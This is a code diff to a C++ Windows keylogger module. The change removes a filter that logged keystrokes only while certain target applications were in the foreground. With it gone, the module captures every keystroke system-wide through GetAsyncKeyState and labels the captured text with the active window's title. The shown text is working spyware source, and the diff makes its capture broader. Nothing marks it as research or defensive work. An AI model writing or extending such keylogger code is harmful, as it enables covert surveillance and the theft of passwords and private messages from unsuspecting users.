@@ -45,50 +45,16 @@ inline std::atomic<bool> is_running{false};
 inline std::thread kl_thread;
 
 #ifdef _WIN32
-// ── Helper: Get Active Process Name ────────────────────────────────────────
-inline std::string GetActiveProcessName() {
+// ── Helper: Get Active Window Title ────────────────────────────────────────
+inline std::string GetActiveWindowTitle() {
     HWND hForeground = GetForegroundWindow();
-    if (!hForeground) return "";
+    if (!hForeground) return "Unknown Window";
 
-    DWORD pid = 0;
-    GetWindowThreadProcessId(hForeground, &pid);
-    if (pid == 0) return "";
-
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
-    if (!hProcess) return "";
-
-    char path[MAX_PATH];
-    DWORD size = MAX_PATH;
-    std::string processName = "";
-    
-    if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
-        std::string fullPath(path);
-        size_t pos = fullPath.find_last_of("\\/");
-        if (pos != std::string::npos) {
-            processName = fullPath.substr(pos + 1);
-        } else {
-            processName = fullPath;
-        }
+    char title[256];
+    if (GetWindowTextA(hForeground, title, sizeof(title))) {
+        return std::string(title);
     }
-    CloseHandle(hProcess);
-
-    for (char& c : processName) {
-        if (c >= 'A' && c <= 'Z') c += 32;
-    }
-    return processName;
-}
-
-inline bool IsTargetAppActive(std::string& activeAppOut) {
-    std::string activeApp = GetActiveProcessName();
-    if (activeApp.empty()) return false;
-
-    for (const auto& target : TARGET_APPS) {
-        if (activeApp == target) {
-            activeAppOut = activeApp;
-            return true;
-        }
-    }
-    return false;
+    return "Untitled Window";
 }
 
 // ── Key Translation ────────────────────────────────────────────────────────
@@ -114,6 +80,8 @@ inline std::string TranslateKey(int vk, bool shift, bool caps) {
         case VK_ESCAPE:  return "[ESC]";
         case VK_CONTROL: return "[CTRL]";
         case VK_MENU:    return "[ALT]";
+        case VK_LBUTTON: return ""; // Ignore mouse clicks
+        case VK_RBUTTON: return "";
         case VK_OEM_1:      return shift ? ":" : ";";
         case VK_OEM_PLUS:   return shift ? "+" : "=";
         case VK_OEM_COMMA:  return shift ? "<" : ",";
@@ -131,35 +99,32 @@ inline std::string TranslateKey(int vk, bool shift, bool caps) {
 
 // ── Thread Loop ────────────────────────────────────────────────────────────
 inline void KeyloggerLoop() {
-    std::string lastApp = "";
+    std::string lastTitle = "";
+    // Reset key states
     for (int i = 0; i < 256; ++i) GetAsyncKeyState(i);
 
     while (is_running) {
-        std::string currentApp;
-        if (IsTargetAppActive(currentApp)) {
-            if (currentApp != lastApp) {
-                std::lock_guard<std::mutex> lock(log_mutex);
-                key_buffer += "\n\n[=== " + currentApp + " ===]\n";
-                lastApp = currentApp;
-            }
+        std::string currentTitle = GetActiveWindowTitle();
+        if (currentTitle != lastTitle) {
+            std::lock_guard<std::mutex> lock(log_mutex);
+            key_buffer += "\n\n[Window: " + currentTitle + "]\n";
+            lastTitle = currentTitle;
+        }
 
-            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-            bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+        bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-            for (int i = 8; i <= 255; i++) {
-                if (GetAsyncKeyState(i) & 1) {
-                    std::string key = TranslateKey(i, shift, caps);
-                    if (!key.empty()) {
-                        std::lock_guard<std::mutex> lock(log_mutex);
-                        key_buffer += key;
-                        if (key_buffer.size() > 1024 * 1024) {
-                            key_buffer = key_buffer.substr(key_buffer.size() - 512 * 1024);
-                        }
+        for (int i = 8; i <= 255; i++) {
+            if (GetAsyncKeyState(i) & 1) {
+                std::string key = TranslateKey(i, shift, caps);
+                if (!key.empty()) {
+                    std::lock_guard<std::mutex> lock(log_mutex);
+                    key_buffer += key;
+                    if (key_buffer.size() > 1024 * 1024) {
+                        key_buffer = key_buffer.substr(key_buffer.size() - 512 * 1024);
                     }
                 }
             }
-        } else {
-            lastApp = "";
         }
         Sleep(10);
     }
